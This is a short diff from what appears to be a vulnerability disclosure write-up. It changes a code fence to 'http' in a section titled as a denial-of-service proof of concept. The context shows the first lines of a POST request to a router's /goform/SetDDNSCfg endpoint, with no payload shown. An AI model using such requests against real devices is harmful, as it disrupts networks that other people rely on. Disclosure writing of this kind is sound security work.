@@ -29,7 +29,7 @@ Poc of Denial of Service(DoS):
 
 
 
-```
+```http
 POST /goform/SetDDNSCfg HTTP/1.1
 Host: 192.168.2.1
 Connection: close
